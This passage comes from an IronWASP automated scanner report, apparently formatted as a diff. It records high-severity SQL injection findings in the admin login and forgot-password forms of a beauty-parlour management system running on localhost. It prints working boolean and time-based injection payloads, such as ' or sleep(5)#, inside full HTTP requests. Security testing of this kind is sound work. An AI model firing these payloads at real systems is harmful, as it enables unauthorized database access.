+IronWASP sent four payloads to the application with SQL code snippets in them.<br>Payload A - <span class='hlg'>tttttxxx' or 's'='s</span><br>Payload B - <span class='hlg'>tttttxxx' or 's'='r</span><br>Payload C - <span class='hlg'>tttttxxx' or 't'='t</span><br>Payload D - <span class='hlg'>tttttxxx' or 't'='r</span><br>Payload A and C have a boolean condition after the <span class='hlg'>OR</span> keyword that will evaluate to true. The boolean condition in Payload B and D would evaluate to false.<br>The response for Payload A and C were similar to each other and were different from the response received for Payload B and D. This indicates that the application was actually evaluating the boolean condition in the payloads. So since Payload A and C both has a true boolean condition their responses are similar, C and D had a false boolean condition.<br>If the application was not actually evaluating the boolean condition then all four payload should have returned very similar responses. Therefore this indicates that SQL syntax from the payload is executed as part of the SQL query on the server.
+<div class='fpa_check'><div class='fpa_check_title'>False Positive Check Assistance:</div>
+Manually analyze the responses received for the four payloads and confirm if the type of similarity explained above actually exists in them. Try resending the same payloads again but with values in the boolean expression and check if this behaviour is repeated.<br>If you discover that this issue was a false positive then please consider reporting this to <span class='icb'>lava<span class='inv'></span>@<span class='inv'></span>ironwasp<span class='inv'></span>.<span class='inv'></span>org</span>. Your feedback will help improve the accuracy of the scanner.
+</div>
+<div class='trigger_desc'>The relevant parts of the requests/responses pairs associated with the check explained in this reason section are available below.</div>
+<div class='trigger'>
+<span class='ihh'> Request sent by Scanner: </span><br><br><span class='icb'>The payload in this request contains the conditional operator 'or' followed by the SQL condition 's'='s which evaluates to true. The payload is tttttxxx' or 's'='s</span><br><br>POST http://127.0.0.1/4.quality-beauty-parlour-management-system/bea/admin/forgot-password.php HTTP/1.1<br>Host: 127.0.0.1<br><span class='icb'>[---- Snipped parts of HTTP headers section for brevity ----]</span><br>Cookie: PHPSESSID=v2fb27t21jfijglkosqbk37lcj<br><br>email=ttttt&amp;contactno=<span class='hlg'>tttttxxx'+or+'s'%3d's</span>&amp;submit=Reset<br><br><span class='ihh'> Information about the Response from the Server: </span><br><br><span class='icb'>This response is the result of the first boolean true condition based payload. This response is equal to the response of the second boolean true condition payload and different from the responses of the boolean false condition payloads.</span><br><br>
+</div>
+<div class='trigger'>
+<span class='ihh'> Request sent by Scanner: </span><br><br><span class='icb'>The payload in this request contains the conditional operator 'or' followed by the SQL condition 's'='r which evaluates to false. The payload is tttttxxx' or 's'='r</span><br><br>POST http://127.0.0.1/4.quality-beauty-parlour-management-system/bea/admin/forgot-password.php HTTP/1.1<br>Host: 127.0.0.1<br><span class='icb'>[---- Snipped parts of HTTP headers section for brevity ----]</span><br>Cookie: PHPSESSID=v2fb27t21jfijglkosqbk37lcj<br><br>email=ttttt&amp;contactno=<span class='hlg'>tttttxxx'+or+'s'%3d'r</span>&amp;submit=Reset<br><br><span class='ihh'> Information about the Response from the Server: </span><br><br><span class='icb'>This response is the result of the first boolean false condition based payload. This response is equal to the response of the second boolean false condition payload and different from the responses of the boolean true condition payloads.</span><br><br>
+</div>
+<div class='trigger'>
+<span class='ihh'> Request sent by Scanner: </span><br><br><span class='icb'>The payload in this request contains the conditional operator 'or' followed by the SQL condition 't'='t which evaluates to true. The payload is tttttxxx' or 't'='t</span><br><br>POST http://127.0.0.1/4.quality-beauty-parlour-management-system/bea/admin/forgot-password.php HTTP/1.1<br>Host: 127.0.0.1<br><span class='icb'>[---- Snipped parts of HTTP headers section for brevity ----]</span><br>Cookie: PHPSESSID=v2fb27t21jfijglkosqbk37lcj<br><br>email=ttttt&amp;contactno=<span class='hlg'>tttttxxx'+or+'t'%3d't</span>&amp;submit=Reset<br><br><span class='ihh'> Information about the Response from the Server: </span><br><br><span class='icb'>This response is the result of the second boolean true condition based payload. This response is equal to the response of the first boolean true condition payload and different from the responses of the boolean false condition payloads.</span><br><br>
+</div>
+<div class='trigger'>
+<span class='ihh'> Request sent by Scanner: </span><br><br><span class='icb'>The payload in this request contains the conditional operator 'or' followed by the SQL condition 't'='r which evaluates to false. The payload is tttttxxx' or 't'='r</span><br><br>POST http://127.0.0.1/4.quality-beauty-parlour-management-system/bea/admin/forgot-password.php HTTP/1.1<br>Host: 127.0.0.1<br><span class='icb'>[---- Snipped parts of HTTP headers section for brevity ----]</span><br>Cookie: PHPSESSID=v2fb27t21jfijglkosqbk37lcj<br><br>email=ttttt&amp;contactno=<span class='hlg'>tttttxxx'+or+'t'%3d'r</span>&amp;submit=Reset<br><br><span class='ihh'> Information about the Response from the Server: </span><br><br><span class='icb'>This response is the result of the second boolean false condition based payload. This response is equal to the response of the first boolean false condition payload and different from the responses of the boolean true condition payloads.</span><br><br>
+</div>
+</div>
+<div class='reason'><div class='reason_title'>Reason 2:</div>
+IronWASP sent <span class='hlg'>' or sleep(5)#</span> as payload to the application. This payload has a small snippet of SQL code that will cause the database server to sleep for <span class='hlg'>5000</span> milliseconds. If this code is executed then the application will return the response <span class='hlg'>5000</span> milliseconds later than usual. After the payload was injected the response from the application took <span class='hlg'>9062</span> milliseconds. Normally this particular request is processed at around </span>8</span> milliseconds. This indicates that the injected SQL code snippet could have been executed on the server-side.
+<div class='fpa_check'><div class='fpa_check_title'>False Positive Check Assistance:</div>
+To check if this was a valid case or a false positive you can manually inject the same payload but by changing the number of seconds of delay to different values. Then you can observe if the time taken for the response to be returned is affected accordingly.<br>If you discover that this issue was a false positive then please consider reporting this to <span class='icb'>lava<span class='inv'></span>@<span class='inv'></span>ironwasp<span class='inv'></span>.<span class='inv'></span>org</span>. Your feedback will help improve the accuracy of the scanner.
+</div>
+<div class='trigger_desc'>The relevant parts of the requests/responses pairs associated with the check explained in this reason section are available below.</div>
+<div class='trigger'>
+<span class='ihh'> Request sent by Scanner: </span><br><br><span class='icb'>The payload in this request contains a SQL query snippet which if executed will cause a delay of 5000 milliseconds. The payload is ' or sleep(5)#</span><br><br>POST http://127.0.0.1/4.quality-beauty-parlour-management-system/bea/admin/forgot-password.php HTTP/1.1<br>Host: 127.0.0.1<br><span class='icb'>[---- Snipped parts of HTTP headers section for brevity ----]</span><br>Cookie: PHPSESSID=v2fb27t21jfijglkosqbk37lcj<br><br>email=ttttt&amp;contactno=<span class='hlg'>'+or+sleep(5)%23</span>&amp;submit=Reset<br><br><span class='ihh'> Information about the Response from the Server: </span><br><br><span class='icb'>It took 9062 milliseconds to get this response. It took so long because of the 5000 milliseconds delay caused by the payload.</span><br><br>
+</div>
+</div>
+<div class='reason'><div class='reason_title'>Reason 3:</div>
+IronWASP sent <span class='hlg'>' or sleep(5)='</span> as payload to the application. This payload has a small snippet of SQL code that will cause the database server to sleep for <span class='hlg'>5000</span> milliseconds. If this code is executed then the application will return the response <span class='hlg'>5000</span> milliseconds later than usual. After the payload was injected the response from the application took <span class='hlg'>10027</span> milliseconds. Normally this particular request is processed at around </span>8</span> milliseconds. This indicates that the injected SQL code snippet could have been executed on the server-side.
+<div class='fpa_check'><div class='fpa_check_title'>False Positive Check Assistance:</div>
+To check if this was a valid case or a false positive you can manually inject the same payload but by changing the number of seconds of delay to different values. Then you can observe if the time taken for the response to be returned is affected accordingly.<br>If you discover that this issue was a false positive then please consider reporting this to <span class='icb'>lava<span class='inv'></span>@<span class='inv'></span>ironwasp<span class='inv'></span>.<span class='inv'></span>org</span>. Your feedback will help improve the accuracy of the scanner.
+</div>
+<div class='trigger_desc'>The relevant parts of the requests/responses pairs associated with the check explained in this reason section are available below.</div>
+<div class='trigger'>
+<span class='ihh'> Request sent by Scanner: </span><br><br><span class='icb'>The payload in this request contains a SQL query snippet which if executed will cause a delay of 5000 milliseconds. The payload is ' or sleep(5)='</span><br><br>POST http://127.0.0.1/4.quality-beauty-parlour-management-system/bea/admin/forgot-password.php HTTP/1.1<br>Host: 127.0.0.1<br><span class='icb'>[---- Snipped parts of HTTP headers section for brevity ----]</span><br>Cookie: PHPSESSID=v2fb27t21jfijglkosqbk37lcj<br><br>email=ttttt&amp;contactno=<span class='hlg'>'+or+sleep(5)%3d'</span>&amp;submit=Reset<br><br><span class='ihh'> Information about the Response from the Server: </span><br><br><span class='icb'>It took 10027 milliseconds to get this response. It took so long because of the 5000 milliseconds delay caused by the payload.</span><br><br>
+</div>
+</div>
+</div>
+<div class='finding' id='finding16'>
+<div class='high_finding_title'>SQL Injection Detected</div>
+<div class='finding_nav_links'><a href='#finding15'>&lt;&lt;&lt;</a><a href='#finding17'>&gt;&gt;&gt;</a></div>
+<table cellpadding='2' cellspacing='2'>
+<tr><div class='type'><td><span class='fname'>Type:</td><td></span>Vulnerability</td></div></tr>
+<tr><div class='severity'><td><span class='fname'>Severity:</span></td><td><span class='icr'>High</span></td></div></tr>
+<tr><div class='confidence'><td><span class='fname'>Confidence:</span></td><td>Medium</td></div>
+</tr>
+<tr><div class='type'><td><span class='fname'>Found By:</span></td><td>Active Scanning</td></div></tr>
+</table>
+<br>
+<table cellpadding='2' cellspacing='2'>
+<tr><div class='affected_host'><td><span class='fname'>Affected Site:</span></td><td>http://127.0.0.1/</td></div></tr>
+<tr><div class='affected_url'><td><span class='fname'>Affected Url:</span></td><td><span class='affected_url'>/4.quality-beauty-parlour-management-system/bea/admin/index.php</span></td></div></tr>
+<tr><div class='affected_parameter'><td><span class='fname'>Affected Parameter:</span></td><td>username</td></div></tr>
+<tr><div class='affected_section'><td><span class='fname'>Parameter Location:</span></td><td>Body</td></div></tr>
+</table>
+<div class='desc'><div class='desc_title'>Description:</div>SQL Injection was identified in the <span class='ico'><b>username</b></span> parameter of the <span class='ico'><b>Body</b></span> section of the scanned request.<br><br>SQL Injection is an issue where it is possible execute SQL queries on the database being used on the server-side. For more details on this issue refer <span class='icb'>https://www.owasp.org/index.php/SQL_Injection</span><br><br></div>
+<div class='reason_section_title'>Reasons:</div>
+IronWASP has reported this issue because of the following reason:<br>
+<div class='reason'><div class='reason_title'>Reason:</div>
+IronWASP sent <span class='hlg'>' or sleep(5)#</span> as payload to the application. This payload has a small snippet of SQL code that will cause the database server to sleep for <span class='hlg'>5000</span> milliseconds. If this code is executed then the application will return the response <span class='hlg'>5000</span> milliseconds later than usual. After the payload was injected the response from the application took <span class='hlg'>10041</span> milliseconds. Normally this particular request is processed at around </span>11</span> milliseconds. This indicates that the injected SQL code snippet could have been executed on the server-side.
+<div class='fpa_check'><div class='fpa_check_title'>False Positive Check Assistance:</div>
+To check if this was a valid case or a false positive you can manually inject the same payload but by changing the number of seconds of delay to different values. Then you can observe if the time taken for the response to be returned is affected accordingly.<br>If you discover that this issue was a false positive then please consider reporting this to <span class='icb'>lava<span class='inv'></span>@<span class='inv'></span>ironwasp<span class='inv'></span>.<span class='inv'></span>org</span>. Your feedback will help improve the accuracy of the scanner.
+</div>
+<div class='trigger_desc'>The relevant parts of the requests/responses pairs associated with the check explained in this reason section are available below.</div>
+<div class='trigger'>
+<span class='ihh'> Request sent by Scanner: </span><br><br><span class='icb'>The payload in this request contains a SQL query snippet which if executed will cause a delay of 5000 milliseconds. The payload is ' or sleep(5)#</span><br><br>POST http://127.0.0.1/4.quality-beauty-parlour-management-system/bea/admin/index.php HTTP/1.1<br>Host: 127.0.0.1<br><span class='icb'>[---- Snipped parts of HTTP headers section for brevity ----]</span><br>Cookie: PHPSESSID=v2fb27t21jfijglkosqbk37lcj<br><br>username=<span class='hlg'>'+or+sleep(5)%23</span>&amp;password=bb&amp;login=Sign+In<br><br><span class='ihh'> Information about the Response from the Server: </span><br><br><span class='icb'>It took 10041 milliseconds to get this response. It took so long because of the 5000 milliseconds delay caused by the payload.</span><br><br>
+</div>
+</div>
+</div>
+<div class='finding' id='finding17'>
+<div class='high_finding_title'>SQL Injection Detected</div>
+<div class='finding_nav_links'><a href='#finding16'>&lt;&lt;&lt;</a><a href='#finding18'>&gt;&gt;&gt;</a></div>
+<table cellpadding='2' cellspacing='2'>
+<tr><div class='type'><td><span class='fname'>Type:</td><td></span>Vulnerability</td></div></tr>
+<tr><div class='severity'><td><span class='fname'>Severity:</span></td><td><span class='icr'>High</span></td></div></tr>
+<tr><div class='confidence'><td><span class='fname'>Confidence:</span></td><td>Medium</td></div>
+</tr>
+<tr><div class='type'><td><span class='fname'>Found By:</span></td><td>Active Scanning</td></div></tr>
+</table>
+<br>
+<table cellpadding='2' cellspacing='2'>
+<tr><div class='affected_host'><td><span class='fname'>Affected Site:</span></td><td>http://127.0.0.1/</td></div></tr>
+<tr><div class='affected_url'><td><span class='fname'>Affected Url:</span></td><td><span class='affected_url'>/4.quality-beauty-parlour-management-system/bea/admin/forgot-password.php</span></td></div></tr>
+<tr><div class='affected_parameter'><td><span class='fname'>Affected Parameter:</span></td><td>contactno</td></div></tr>
+<tr><div class='affected_section'><td><span class='fname'>Parameter Location:</span></td><td>Body</td></div></tr>
+</table>
+<div class='desc'><div class='desc_title'>Description:</div>SQL Injection was identified in the <span class='ico'><b>contactno</b></span> parameter of the <span class='ico'><b>Body</b></span> section of the scanned request.<br><br>SQL Injection is an issue where it is possible execute SQL queries on the database being used on the server-side. For more details on this issue refer <span class='icb'>https://www.owasp.org/index.php/SQL_Injection</span><br><br></div>
+<div class='reason_section_title'>Reasons:</div>
+IronWASP has reported this issue because of the following reason:<br>
+<div class='reason'><div class='reason_title'>Reason:</div>
+IronWASP sent four payloads to the application with SQL code snippets in them.<br>Payload A - <span class='hlg'>ssssxxx' or 's'='s</span><br>Payload B - <span class='hlg'>ssssxxx' or 's'='r</span><br>Payload C - <span class='hlg'>ssssxxx' or 't'='t</span><br>Payload D - <span class='hlg'>ssssxxx' or 't'='r</span><br>Payload A and C have a boolean condition after the <span class='hlg'>OR</span> keyword that will evaluate to true. The boolean condition in Payload B and D would evaluate to false.<br>The response for Payload A and C were similar to each other and were different from the response received for Payload B and D. This indicates that the application was actually evaluating the boolean condition in the payloads. So since Payload A and C both has a true boolean condition their responses are similar, C and D had a false boolean condition.<br>If the application was not actually evaluating the boolean condition then all four payload should have returned very similar responses. Therefore this indicates that SQL syntax from the payload is executed as part of the SQL query on the server.
+<div class='fpa_check'><div class='fpa_check_title'>False Positive Check Assistance:</div>
+Manually analyze the responses received for the four payloads and confirm if the type of similarity explained above actually exists in them. Try resending the same payloads again but with values in the boolean expression and check if this behaviour is repeated.<br>If you discover that this issue was a false positive then please consider reporting this to <span class='icb'>lava<span class='inv'></span>@<span class='inv'></span>ironwasp<span class='inv'></span>.<span class='inv'></span>org</span>. Your feedback will help improve the accuracy of the scanner.
+</div>
+<div class='trigger_desc'>The relevant parts of the requests/responses pairs associated with the check explained in this reason section are available below.</div>
+<div class='trigger'>
+<span class='ihh'> Request sent by Scanner: </span><br><br><span class='icb'>The payload in this request contains the conditional operator 'or' followed by the SQL condition 's'='s which evaluates to true. The payload is ssssxxx' or 's'='s</span><br><br>POST http://127.0.0.1/4.quality-beauty-parlour-management-system/bea/admin/forgot-password.php HTTP/1.1<br>Host: 127.0.0.1<br><span class='icb'>[---- Snipped parts of HTTP headers section for brevity ----]</span><br>Cookie: PHPSESSID=v2fb27t21jfijglkosqbk37lcj<br><br>email=ssss&amp;contactno=<span class='hlg'>ssssxxx'+or+'s'%3d's</span>&amp;submit=Reset<br><br><span class='ihh'> Information about the Response from the Server: </span><br><br><span class='icb'>This response is the result of the first boolean true condition based payload. This response is equal to the response of the second boolean true condition payload and different from the responses of the boolean false condition payloads.</span><br><br>
+</div>
+<div class='trigger'>
+<span class='ihh'> Request sent by Scanner: </span><br><br><span class='icb'>The payload in this request contains the conditional operator 'or' followed by the SQL condition 's'='r which evaluates to false. The payload is ssssxxx' or 's'='r</span><br><br>POST http://127.0.0.1/4.quality-beauty-parlour-management-system/bea/admin/forgot-password.php HTTP/1.1<br>Host: 127.0.0.1<br><span class='icb'>[---- Snipped parts of HTTP headers section for brevity ----]</span><br>Cookie: PHPSESSID=v2fb27t21jfijglkosqbk37lcj<br><br>email=ssss&amp;contactno=<span class='hlg'>ssssxxx'+or+'s'%3d'r</span>&amp;submit=Reset<br><br><span class='ihh'> Information about the Response from the Server: </span><br><br><span class='icb'>This response is the result of the first boolean false condition based payload. This response is equal to the response of the second boolean false condition payload and different from the responses of the boolean true condition payloads.</span><br><br>
+</div>
+<div class='trigger'>
+<span class='ihh'> Request sent by Scanner: </span><br><br><span class='icb'>The payload in this request contains the conditional operator 'or' followed by the SQL condition 't'='t which evaluates to true. The payload is ssssxxx' or 't'='t</span><br><br>POST http://127.0.0.1/4.quality-beauty-parlour-management-system/bea/admin/forgot-password.php HTTP/1.1<br>Host: 127.0.0.1<br><span class='icb'>[---- Snipped parts of HTTP headers section for brevity ----]</span><br>Cookie: PHPSESSID=v2fb27t21jfijglkosqbk37lcj<br><br>email=ssss&amp;contactno=<span class='hlg'>ssssxxx'+or+'t'%3d't</span>&amp;submit=Reset<br><br><span class='ihh'> Information about the Response from the Server: </span><br><br><span class='icb'>This response is the result of the second boolean true condition based payload. This response is equal to the response of the first boolean true condition payload and different from the responses of the boolean false condition payloads.</span><br><br>
+</div>
+<div class='trigger'>
+<span class='ihh'> Request sent by Scanner: </span><br><br><span class='icb'>The payload in this request contains the conditional operator 'or' followed by the SQL condition 't'='r which evaluates to false. The payload is ssssxxx' or 't'='r</span><br><br>POST http://127.0.0.1/4.quality-beauty-parlour-management-system/bea/admin/forgot-password.php HTTP/1.1<br>Host: 127.0.0.1<br><span class='icb'>[---- Snipped parts of HTTP headers section for brevity ----]</span><br>Cookie: PHPSESSID=v2fb27t21jfijglkosqbk37lcj<br><br>email=ssss&amp;contactno=<span class='hlg'>ssssxxx'+or+'t'%3d'r</span>&amp;submit=Reset<br><br><span class='ihh'> Information about the Response from the Server: </span><br><br><span class='icb'>This response is the result of the second boolean false condition based payload. This response is equal to the response of the first boolean false condition payload and different from the responses of the boolean true condition payloads.</span><br><br>
+</div>
+</div>
+</div>
+<div class='finding' id='finding18'>
+<div class='high_finding_title'>SQL Injection Detected</div>
+<div class='finding_nav_links'><a href='#finding17'>&lt;&lt;&lt;</a><a href='#finding19'>&gt;&gt;&gt;</a></div>
+<table cellpadding='2' cellspacing='2'>
+<tr><div class='type'><td><span class='fname'>Type:</td><td></span>Vulnerability</td></div></tr>
+<tr><div class='severity'><td><span class='fname'>Severity:</span></td><td><span class='icr'>High</span></td></div></tr>
+<tr><div class='confidence'><td><span class='fname'>Confidence:</span></td><td>Medium</td></div>
+</tr>
+<tr><div class='type'><td><span class='fname'>Found By:</span></td><td>Active Scanning</td></div></tr>
+</table>
+<br>
+<table cellpadding='2' cellspacing='2'>
+<tr><div class='affected_host'><td><span class='fname'>Affected Site:</span></td><td>http://127.0.0.1/</td></div></tr>
+<tr><div class='affected_url'><td><span class='fname'>Affected Url:</span></td><td><span class='affected_url'>/4.quality-beauty-parlour-management-system/bea/admin/forgot-password.php</span></td></div></tr>
+<tr><div class='affected_parameter'><td><span class='fname'>Affected Parameter:</span></td><td>contactno</td></div></tr>
+<tr><div class='affected_section'><td><span class='fname'>Parameter Location:</span></td><td>Body</td></div></tr>
+</table>
+<div class='desc'><div class='desc_title'>Description:</div>SQL Injection was identified in the <span class='ico'><b>contactno</b></span> parameter of the <span class='ico'><b>Body</b></span> section of the scanned request.<br><br>SQL Injection is an issue where it is possible execute SQL queries on the database being used on the server-side. For more details on this issue refer <span class='icb'>https://www.owasp.org/index.php/SQL_Injection</span><br><br></div>
+<div class='reason_section_title'>Reasons:</div>
+IronWASP has reported this issue because of the following reasons:<br>
+<div class='reason'><div class='reason_title'>Reason 1:</div>
+IronWASP sent four payloads to the application with SQL code snippets in them.<br>Payload A - <span class='hlg'>bbxxx' or 's'='s</span><br>Payload B - <span class='hlg'>bbxxx' or 's'='r</span><br>Payload C - <span class='hlg'>bbxxx' or 't'='t</span><br>Payload D - <span class='hlg'>bbxxx' or 't'='r</span><br>Payload A and C have a boolean condition after the <span class='hlg'>OR</span> keyword that will evaluate to true. The boolean condition in Payload B and D would evaluate to false.<br>The response for Payload A and C were similar to each other and were different from the response received for Payload B and D. This indicates that the application was actually evaluating the boolean condition in the payloads. So since Payload A and C both has a true boolean condition their responses are similar, C and D had a false boolean condition.<br>If the application was not actually evaluating the boolean condition then all four payload should have returned very similar responses. Therefore this indicates that SQL syntax from the payload is executed as part of the SQL query on the server.
+<div class='fpa_check'><div class='fpa_check_title'>False Positive Check Assistance:</div>
+Manually analyze the responses received for the four payloads and confirm if the type of similarity explained above actually exists in them. Try resending the same payloads again but with values in the boolean expression and check if this behaviour is repeated.<br>If you discover that this issue was a false positive then please consider reporting this to <span class='icb'>lava<span class='inv'></span>@<span class='inv'></span>ironwasp<span class='inv'></span>.<span class='inv'></span>org</span>. Your feedback will help improve the accuracy of the scanner.
+</div>
+<div class='trigger_desc'>The relevant parts of the requests/responses pairs associated with the check explained in this reason section are available below.</div>
+<div class='trigger'>
+<span class='ihh'> Request sent by Scanner: </span><br><br><span class='icb'>The payload in this request contains the conditional operator 'or' followed by the SQL condition 's'='s which evaluates to true. The payload is bbxxx' or 's'='s</span><br><br>POST http://127.0.0.1/4.quality-beauty-parlour-management-system/bea/admin/forgot-password.php HTTP/1.1<br>Host: 127.0.0.1<br><span class='icb'>[---- Snipped parts of HTTP headers section for brevity ----]</span><br>Cookie: PHPSESSID=v2fb27t21jfijglkosqbk37lcj<br><br>email=bb&amp;contactno=<span class='hlg'>bbxxx'+or+'s'%3d's</span>&amp;submit=Reset<br><br><span class='ihh'> Information about the Response from the Server: </span><br><br><span class='icb'>This response is the result of the first boolean true condition based payload. This response is equal to the response of the second boolean true condition payload and different from the responses of the boolean false condition payloads.</span><br><br>
+</div>
+<div class='trigger'>
+<span class='ihh'> Request sent by Scanner: </span><br><br><span class='icb'>The payload in this request contains the conditional operator 'or' followed by the SQL condition 's'='r which evaluates to false. The payload is bbxxx' or 's'='r</span><br><br>POST http://127.0.0.1/4.quality-beauty-parlour-management-system/bea/admin/forgot-password.php HTTP/1.1<br>Host: 127.0.0.1<br><span class='icb'>[---- Snipped parts of HTTP headers section for brevity ----]</span><br>Cookie: PHPSESSID=v2fb27t21jfijglkosqbk37lcj<br><br>email=bb&amp;contactno=<span class='hlg'>bbxxx'+or+'s'%3d'r</span>&amp;submit=Reset<br><br><span class='ihh'> Information about the Response from the Server: </span><br><br><span class='icb'>This response is the result of the first boolean false condition based payload. This response is equal to the response of the second boolean false condition payload and different from the responses of the boolean true condition payloads.</span><br><br>
+</div>
+<div class='trigger'>
+<span class='ihh'> Request sent by Scanner: </span><br><br><span class='icb'>The payload in this request contains the conditional operator 'or' followed by the SQL condition 't'='t which evaluates to true. The payload is bbxxx' or 't'='t</span><br><br>POST http://127.0.0.1/4.quality-beauty-parlour-management-system/bea/admin/forgot-password.php HTTP/1.1<br>Host: 127.0.0.1<br><span class='icb'>[---- Snipped parts of HTTP headers section for brevity ----]</span><br>Cookie: PHPSESSID=v2fb27t21jfijglkosqbk37lcj<br><br>email=bb&amp;contactno=<span class='hlg'>bbxxx'+or+'t'%3d't</span>&amp;submit=Reset<br><br><span class='ihh'> Information about the Response from the Server: </span><br><br><span class='icb'>This response is the result of the second boolean true condition based payload. This response is equal to the response of the first boolean true condition payload and different from the responses of the boolean false condition payloads.</span><br><br>
+</div>
+<div class='trigger'>
+<span class='ihh'> Request sent by Scanner: </span><br><br><span class='icb'>The payload in this request contains the conditional operator 'or' followed by the SQL condition 't'='r which evaluates to false. The payload is bbxxx' or 't'='r</span><br><br>POST http://127.0.0.1/4.quality-beauty-parlour-management-system/bea/admin/forgot-password.php HTTP/1.1<br>Host: 127.0.0.1<br><span class='icb'>[---- Snipped parts of HTTP headers section for brevity ----]</span><br>Cookie: PHPSESSID=v2fb27t21jfijglkosqbk37lcj<br><br>email=bb&amp;contactno=<span class='hlg'>bbxxx'+or+'t'%3d'r</span>&amp;submit=Reset<br><br><span class='ihh'> Information about the Response from the Server: </span><br><br><span class='icb'>This response is the result of the second boolean false condition based payload. This response is equal to the response of the first boolean false condition payload and different from the responses of the boolean true condition payloads.</span><br><br>
+</div>
+</div>
+<div class='reason'><div class='reason_title'>Reason 2:</div>
+IronWASP sent <span class='hlg'>' or sleep(5)#</span> as payload to the application. This payload has a small snippet of SQL code that will cause the database server to sleep for <span class='hlg'>5000</span> milliseconds. If this code is executed then the application will return the response <span class='hlg'>5000</span> milliseconds later than usual. After the payload was injected the response from the application took <span class='hlg'>9027</span> milliseconds. Normally this particular request is processed at around </span>4</span> milliseconds. This indicates that the injected SQL code snippet could have been executed on the server-side.
+<div class='fpa_check'><div class='fpa_check_title'>False Positive Check Assistance:</div>
+To check if this was a valid case or a false positive you can manually inject the same payload but by changing the number of seconds of delay to different values. Then you can observe if the time taken for the response to be returned is affected accordingly.<br>If you discover that this issue was a false positive then please consider reporting this to <span class='icb'>lava<span class='inv'></span>@<span class='inv'></span>ironwasp<span class='inv'></span>.<span class='inv'></span>org</span>. Your feedback will help improve the accuracy of the scanner.
+</div>
+<div class='trigger_desc'>The relevant parts of the requests/responses pairs associated with the check explained in this reason section are available below.</div>
+<div class='trigger'>
+<span class='ihh'> Request sent by Scanner: </span><br><br><span class='icb'>The payload in this request contains a SQL query snippet which if executed will cause a delay of 5000 milliseconds. The payload is ' or sleep(5)#</span><br><br>POST http://127.0.0.1/4.quality-beauty-parlour-management-system/bea/admin/forgot-password.php HTTP/1.1<br>Host: 127.0.0.1<br><span class='icb'>[---- Snipped parts of HTTP headers section for brevity ----]</span><br>Cookie: PHPSESSID=v2fb27t21jfijglkosqbk37lcj<br><br>email=bb&amp;contactno=<span class='hlg'>'+or+sleep(5)%23</span>&amp;submit=Reset<br><br><span class='ihh'> Information about the Response from the Server: </span><br><br><span class='icb'>It took 9027 milliseconds to get this response. It took so long because of the 5000 milliseconds delay caused by the payload.</span><br><br>
+</div>
+</div>
+<div class='reason'><div class='reason_title'>Reason 3:</div>
+IronWASP sent <span class='hlg'>' or sleep(5)='</span> as payload to the application. This payload has a small snippet of SQL code that will cause the database server to sleep for <span class='hlg'>5000</span> milliseconds. If this code is executed then the application will return the response <span class='hlg'>5000</span> milliseconds later than usual. After the payload was injected the response from the application took <span class='hlg'>5022</span> milliseconds. Normally this particular request is processed at around </span>4</span> milliseconds. This indicates that the injected SQL code snippet could have been executed on the server-side.
+<div class='fpa_check'><div class='fpa_check_title'>False Positive Check Assistance:</div>
+To check if this was a valid case or a false positive you can manually inject the same payload but by changing the number of seconds of delay to different values. Then you can observe if the time taken for the response to be returned is affected accordingly.<br>If you discover that this issue was a false positive then please consider reporting this to <span class='icb'>lava<span class='inv'></span>@<span class='inv'></span>ironwasp<span class='inv'></span>.<span class='inv'></span>org</span>. Your feedback will help improve the accuracy of the scanner.
+</div>
+<div class='trigger_desc'>The relevant parts of the requests/responses pairs associated with the check explained in this reason section are available below.</div>
+<div class='trigger'>
+<span class='ihh'> Request sent by Scanner: </span><br><br><span class='icb'>The payload in this request contains a SQL query snippet which if executed will cause a delay of 5000 milliseconds. The payload is ' or sleep(5)='</span><br><br>POST http://127.0.0.1/4.quality-beauty-parlour-management-system/bea/admin/forgot-password.php HTTP/1.1<br>Host: 127.0.0.1<br><span class='icb'>[---- Snipped parts of HTTP headers section for brevity ----]</span><br>Cookie: PHPSESSID=v2fb27t21jfijglkosqbk37lcj<br><br>email=bb&amp;contactno=<span class='hlg'>'+or+sleep(5)%3d'</span>&amp;submit=Reset<br><br><span class='ihh'> Information about the Response from the Server: </span><br><br><span class='icb'>It took 5022 milliseconds to get this response. It took so long because of the 5000 milliseconds delay caused by the payload.</span><br><br>
+</div>
+</div>
+</div>
+<div class='finding' id='finding19'>
+<div class='high_finding_title'>SQL Injection Detected</div>
+<div class='finding_nav_links'><a href='#finding18'>&lt;&lt;&lt;</a><a href='#finding20'>&gt;&gt;&gt;</a></div>
+<table cellpadding='2' cellspacing='2'>
+<tr><div class='type'><td><span class='fname'>Type:</td><td></span>Vulnerability</td></div></tr>
+<tr><div class='severity'><td><span class='fname'>Severity:</span></td><td><span class='icr'>High</span></td></div></tr>
+<tr><div class='confidence'><td><span class='fname'>Confidence:</span></td><td>Medium</td></div>
+</tr>
+<tr><div class='type'><td><span class='fname'>Found By:</span></td><td>Active Scanning</td></div></tr>
+</table>
+<br>
+<table cellpadding='2' cellspacing='2'>
+<tr><div class='affected_host'><td><span class='fname'>Affected Site:</span></td><td>http://127.0.0.1/</td></div></tr>
+<tr><div class='affected_url'><td><span class='fname'>Affected Url:</span></td><td><span class='affected_url'>/4.quality-beauty-parlour-management-system/bea/admin/forgot-password.php</span></td></div></tr>
+<tr><div class='affected_parameter'><td><span class='fname'>Affected Parameter:</span></td><td>email</td></div></tr>
+<tr><div class='affected_section'><td><span class='fname'>Parameter Location:</span></td><td>Body</td></div></tr>
+</table>
+<div class='desc'><div class='desc_title'>Description:</div>SQL Injection was identified in the <span class='ico'><b>email</b></span> parameter of the <span class='ico'><b>Body</b></span> section of the scanned request.<br><br>SQL Injection is an issue where it is possible execute SQL queries on the database being used on the server-side. For more details on this issue refer <span class='icb'>https://www.owasp.org/index.php/SQL_Injection</span><br><br></div>
+<div class='reason_section_title'>Reasons:</div>
+IronWASP has reported this issue because of the following reason:<br>
+<div class='reason'><div class='reason_title'>Reason:</div>
+IronWASP sent <span class='hlg'>' or sleep(5)#</span> as payload to the application. This payload has a small snippet of SQL code that will cause the database server to sleep for <span class='hlg'>5000</span> milliseconds. If this code is executed then the application will return the response <span class='hlg'>5000</span> milliseconds later than usual. After the payload was injected the response from the application took <span class='hlg'>14042</span> milliseconds. Normally this particular request is processed at around </span>0</span> milliseconds. This indicates that the injected SQL code snippet could have been executed on the server-side.
+<div class='fpa_check'><div class='fpa_check_title'>False Positive Check Assistance:</div>
